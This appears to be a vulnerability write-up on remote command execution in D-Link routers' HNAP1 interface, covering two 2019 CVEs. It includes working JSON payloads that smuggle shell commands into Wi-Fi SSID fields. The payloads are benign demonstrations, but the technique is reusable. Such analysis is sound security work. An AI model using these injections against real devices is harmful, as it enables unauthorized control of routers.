Vulnerability: Remote Command Execution (RCE)
Root cause: Invalid sanitization of input allows attackers to inject arbitrary commands into the `exec` function.
Weakness: Lack of proper input validation.
Impact: Attackers can execute arbitrary code on the D-Link router.
Attack vector: Sending a crafted HTTP POST request to specific HNAP1 endpoints.
Required capabilities: The attacker needs to send a POST request to the router's HNAP1 interface. Authentication might be required, as indicated by the `HNAP_AUTH` and `Cookie` headers in the provided examples.
Vulnerable files:
  - /squashfs-root/www/HNAP1/control/SetMasterWLanSettings.php
  - /squashfs-root/www/HNAP1/control/SetWizardConfig.php
Example attack (CVE-2019-17509):
  - Send a POST request to /HNAP1/ with the following JSON payload:
    ```json
    {"SetMasterWLanSettings":{"wl(0).(0)_enable":"1","wl(0).(0)_ssid":"2.4'&&ifconfig>'/www/a.txt","wl(0).(0)_preshared_key":"aXJrZXJPZ2dNVEl6TkRVMk56Zz0=","wl(0).(0)_crypto":"aestkip","wl(1).(0)_enable":"0","wl(1).(0)_ssid":"5.0","wl(1).(0)_preshared_key":"aXJrZXJPZ2c=","wl(1).(0)_crypto":"none"}}
    ```
    This will execute the `ifconfig` command and save the output to `/www/a.txt`.
Example attack (CVE-2019-17510):
  - Send a POST request to /HNAP1/ with the following JSON payload:
    ```json
    {"SetWizardConfig":{"wl(1).(0)_ssid":"aaa&&touch /www/a.txt","wl(0).(0)_ssid":"aaa&&touch /www/a.txt"}}
    ```
    This will execute the `touch /www/a.txt` command, creating an empty file named `a.txt` in the `/www/` directory.
